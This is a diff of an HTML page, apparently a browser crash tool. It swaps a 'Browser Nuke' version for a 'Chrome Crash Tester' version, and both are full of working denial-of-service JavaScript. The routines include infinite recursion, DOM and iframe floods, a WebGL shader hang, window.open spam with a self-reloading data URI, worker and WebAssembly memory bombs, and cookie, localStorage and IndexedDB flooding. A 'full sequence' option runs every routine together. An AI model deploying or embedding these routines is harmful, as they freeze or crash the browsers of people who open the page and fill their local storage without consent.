@@ -3,294 +3,82 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Browser Nuke</title>
+  <title>Chrome Crash Tester</title>
   <style>
-    :root {
-      --bg-start:    #141414;
-      --bg-end:      #1f1f1f;
-      --accent:      #e63946;
-      --accent-60:   rgba(230,57,70,0.6);
-      --border-red:  #c62828;
-      --text:        #f1f1f1;
-      --card-bg:     rgba(30,30,30,0.7);
-      --card-border: rgba(230,57,70,0.4);
-    }
-    *, *::before, *::after {
-      box-sizing: border-box;
-      margin: 0; padding: 0;
-    }
-    html, body {
-      width: 100%; height: 100%;
-      font-family: 'Inter', sans-serif;
-      background: linear-gradient(135deg, var(--bg-start), var(--bg-end));
-      display: flex; align-items: center; justify-content: center;
-      color: var(--text);
-    }
-    .card {
-      background: var(--card-bg);
-      border: 1px solid var(--card-border);
-      border-radius: 12px;
+    body {
+      background: #111;
+      color: #eee;
+      font-family: sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
       padding: 2rem;
-      max-width: 380px; width: 90%;
-      text-align: center;
-      box-shadow: 0 4px 8px rgba(0,0,0,0.5);
     }
-    .title {
-      font-size: 1.75rem;
-      margin-bottom: 0.5rem;
-      letter-spacing: 1px;
-    }
-    .subtitle {
-      font-size: 0.9rem;
-      color: #ccc;
-      margin-bottom: 1.5rem;
-    }
-    .warning {
-      font-size: 0.95rem;
-      color: var(--accent);
-      margin-bottom: 1.5rem;
-      line-height: 1.4;
-    }
-    .button {
-      padding: 0.75rem 1.5rem;
+    h1 { margin-bottom: 0.5rem; }
+    select, button {
       font-size: 1rem;
-      background: var(--accent-60);
-      color: #fff;
-      border: 2px solid var(--border-red);
+      padding: 0.5rem 1rem;
+      margin: 0.5rem;
       border-radius: 4px;
-      cursor: pointer;
-      box-shadow: 0 2px 8px rgba(230,57,70,0.8);
-      transition: background 0.2s, box-shadow 0.3s, transform 0.1s;
+      border: none;
     }
-    .button:hover {
-      background: rgba(230,57,70,0.8);
-      box-shadow: 0 4px 16px rgba(230,57,70,1);
-      transform: translateY(-2px);
-    }
-    .button:focus {
-      outline: none;
-      box-shadow: 0 0 20px rgba(230,57,70,1);
-    }
-    .button:active {
-      transform: translateY(0);
-    }
-    .details {
-      font-size: 0.85rem;
-      color: #888;
-      text-align: left;
-      margin-top: 1rem;
-      line-height: 1.4;
-    }
-    .details ul {
-      list-style: none;
-      padding-left: 1em;
-    }
-    .details li::before {
-      content: "•";
-      color: var(--accent);
-      display: inline-block;
-      width: 1em;
-      margin-left: -1em;
-    }
+    button { background: #d33; color: white; cursor: pointer; }
   </style>
 </head>
 <body>
-  <div class="card">
-    <div class="title">Browser Nuke</div>
-    <div class="subtitle">One click to engage all crash routines</div>
-    <div class="warning">
-      Targets the browser process directly—avoids memory‐based OOM. Use in a safe environment.
-    </div>
-    <button class="button" id="nukeBtn">Crash Browser</button>
-    <div class="details">
-      <p>Key vectors (non‑memory):</p>
-      <ul>
-        <li>Native crash URL</li>
-        <li>GPU context kill</li>
-        <li>Infinite loops & microtasks</li>
-        <li>Sync XHR & reload spam</li>
-        <li>Dialog, history & layout floods</li>
-        <li>Notification & vibration storms</li>
-      </ul>
-    </div>
-  </div>
+  <h1>Chrome Crash Tester</h1>
+  <p>Select a method, then click “CRASH”</p>
+  <select id="method">
+    <option value="stack">Infinite Recursion (Stack Overflow)</option>
+    <option value="dom">DOM Bomb (Element Injection)</option>
+    <option value="canvas">Canvas Flood (Memory Leak)</option>
+    <option value="gpu">WebGL Shader Lock (GPU Crash)</option>
+    <option value="blob">Blob URI Spam (Tab Flood)</option>
+    <option value="worker">Web Worker Memory Bomb</option>
+    <option value="iframe">Infinite Iframe Nesting</option>
+    <option value="alloc">Memory Allocation Loop (RAM Flood)</option>
+    <option value="raf">requestAnimationFrame CPU Lock</option>
+    <option value="xhr">Sync XHR Flood</option>
+    <option value="wasm">WebAssembly Memory Bomb</option>
+    <option value="audio">AudioContext Leak</option>
+    <option value="storage">LocalStorage Flood</option>
+    <option value="cookie">Cookie Flood</option>
+    <option value="db">IndexedDB Bomb</option>
+    <option value="sequence">🔥 Full Sequence (All Methods)</option>
+  </select>
+  <button id="crashBtn">CRASH</button>
 
   <script>
     const crash = {
-      // --- Browser process kill via internal URL (Chrome) ---
-      browserKill() {
-        window.location = 'chrome://inducebrowsercrashforrealz';
-        setTimeout(() => window.location = 'chrome://crash', 100);
-      },
+      stack:     () => { (function r(){ r(); })(); },
+      dom:       () => { while(true) document.body.appendChild(document.createElement('div')); },
+      canvas:    () => { const c=document.createElement('canvas'); c.width=c.height=10000; document.body.appendChild(c); const ctx=c.getContext('2d'); while(true) ctx.fillRect(0,0,10000,10000); },
+      gpu:       () => { const c=document.createElement('canvas'); document.body.appendChild(c); const gl=c.getContext('webgl')||c.getContext('webgl2'); const s=gl.createShader(gl.FRAGMENT_SHADER); gl.shaderSource(s,'void main(){for(;;);}'); gl.compileShader(s); const p=gl.createProgram(); gl.attachShader(p,s); gl.linkProgram(p); gl.useProgram(p); gl.drawArrays(gl.POINTS,0,1); },
+      blob:      () => { const payload='data:text/html;base64,'+btoa('<script>location=location<\\/script>'); while(true) window.open(payload); },
+      worker:    () => { const b=new Blob(['onmessage=()=>{while(true)Array(1e6).fill(0);}'],{type:'application/javascript'}); const u=URL.createObjectURL(b); while(true){ const w=new Worker(u); w.postMessage('go'); } },
+      iframe:    () => { for(let i=0;i<10000;i++){ const f=document.createElement('iframe'); f.src='about:blank'; document.body.appendChild(f);} },
+      alloc:     () => { const a=[]; while(true) a.push(new Array(1e6).fill('*')); },
+      raf:       () => { (function loop(){ for(let i=0;i<100000;i++) Math.sqrt(Math.random()); requestAnimationFrame(loop); })(); },
+      xhr:       () => { while(true){ try{ const r=new XMLHttpRequest(); r.open('GET','/404',false); r.send(); } catch{} } },
+      wasm:      () => { const m=new WebAssembly.Memory({initial:256,maximum:256}); const modBytes=new Uint8Array([0,97,115,109,1,0,0,0,1,4,1,96,0,0,3,2,1,0,5,3,1,0,1,7,7,1,3,103,101,116,0,0,10,9,1,7,0,65,0,11]); WebAssembly.instantiate(modBytes,{env:{memory:m}}).then(() => { while(true) m.grow(1); }); },
+      audio:     () => { (function loop(){ new AudioContext(); loop(); })(); },
+      storage:   () => { while(true) localStorage.setItem('x', new Array(1e6).join('*')); },
+      cookie:    () => { while(true) document.cookie = 'c=' + new Array(1000).join('*'); },
+      db:        () => { let i=0; while(true) indexedDB.open('db'+(i++)).onupgradeneeded = ()=>{}; },
 
-      // --- GPU process crash ---
-      gpuKill() {
-        const c = document.createElement('canvas');
-        document.body.appendChild(c);
-        const gl = c.getContext('webgl2') || c.getContext('webgl');
-        const ext = gl && gl.getExtension('WEBGL_lose_context');
-        if (ext) ext.loseContext();
-      },
-
-      // --- Busy JS thread ---
-      infiniteEval() {
-        while (true) { /* no allocations */ }
-      },
-
-      // --- Promise microtask flood ---
-      promiseBomb() {
-        (function loop() {
-          Promise.resolve().then(loop);
-        })();
-      },
-
-      // --- queueMicrotask flood ---
-      microtaskBomb() {
-        (function loop() {
-          queueMicrotask(loop);
-        })();
-      },
-
-      // --- idleCallback flood ---
-      idleBomb() {
-        if (window.requestIdleCallback) {
-          (function loop() {
-            requestIdleCallback(loop);
-          })();
-        }
-      },
-
-      // --- postMessage spam ---
-      postMessageBomb() {
-        window.addEventListener('message', () => {});
-        while (true) window.postMessage('x','*');
-      },
-
-      // --- Sync XHR flood ---
-      xhrBomb() {
-        while (true) {
-          try {
-            const r = new XMLHttpRequest();
-            r.open('GET','/404',false);
-            r.send();
-          } catch {}
-        }
-      },
-
-      // --- Forced reload spam ---
-      reloadLoop() {
-        while (true) location.reload(true);
-      },
-
-      // --- History.pushState spam ---
-      historyBomb() {
-        for (let i = 0; i < 5000; i++) {
-          history.pushState(null,'',location.href);
-        }
-      },
-
-      // --- Dialog flood ---
-      dialogSpam() {
-        while (true) confirm('Crash?');
-      },
-
-      // --- Layout thrash ---
-      layoutThrash() {
-        while (true) document.body.offsetWidth;
-      },
-
-      // --- Interval storm ---
-      intervalBomb() {
-        setInterval(() => Math.random(), 0);
-      },
-
-      // --- Timeout recursion ---
-      timerBomb() {
-        (function loop(){
-          Math.random();
-          setTimeout(loop,0);
-        })();
-      },
-
-      // --- Notification API spam ---
-      notificationBomb() {
-        if (window.Notification) {
-          Notification.requestPermission(() => {
-            while (true) new Notification('⚠️ Crash', {silent:true});
-          });
-        }
-      },
-
-      // --- Vibration API spam (mobile) ---
-      vibrationBomb() {
-        if (navigator.vibrate) {
-          while (true) navigator.vibrate([200]);
-        }
-      },
-
-      // --- RTCPeerConnection storm ---
-      peerConnectionBomb() {
-        while (true) new RTCPeerConnection();
-      },
-
-      // --- Geolocation spam ---
-      geolocationBomb() {
-        if (navigator.geolocation) {
-          while (true) {
-            navigator.geolocation.getCurrentPosition(()=>{},()=>{});
+      sequence:  function(){
+        for(const k in crash){
+          if(k!=='sequence'){
+            try { crash[k](); } catch(e){}
           }
         }
-      },
-
-      // --- Clipboard API spam ---
-      clipboardBomb() {
-        if (navigator.clipboard) {
-          while (true) navigator.clipboard.writeText('Crash').catch(()=>{});
-        }
-      },
-
-      // --- Fullscreen spam ---
-      fullscreenBomb() {
-        const doc = document.documentElement;
-        (function loop(){
-          if (doc.requestFullscreen) doc.requestFullscreen().catch(()=>{});
-          setTimeout(loop, 0);
-        })();
-      },
-
-      // --- Print dialog spam ---
-      printBomb() {
-        while (true) window.print();
-      },
-
-      // --- ServiceWorker crash bomb ---
-      swBomb() {
-        if (navigator.serviceWorker) {
-          for (let i=0; i<50; i++) {
-            navigator.serviceWorker.register('data:text/javascript,while(1){}');
-          }
-        }
-      },
-
-      // --- Clipboard read spam ---
-      clipboardReadBomb() {
-        if (navigator.clipboard && navigator.clipboard.readText) {
-          while (true) navigator.clipboard.readText().catch(()=>{});
-        }
-      },
-
-      // --- nuke: fire everything at once ---
-      nuke() {
-        Object.values(this).forEach(fn => {
-          if (typeof fn === 'function' && fn.name !== 'nuke') {
-            try { fn(); } catch(err) {}
-          }
-        });
       }
     };
 
-    document.getElementById('nukeBtn')
-            .addEventListener('click', () => crash.nuke());
+    document.getElementById('crashBtn').addEventListener('click', () => {
+      const m = document.getElementById('method').value;
+      setTimeout(() => crash[m](), 100);
+    });
   </script>
 </body>
 </html>
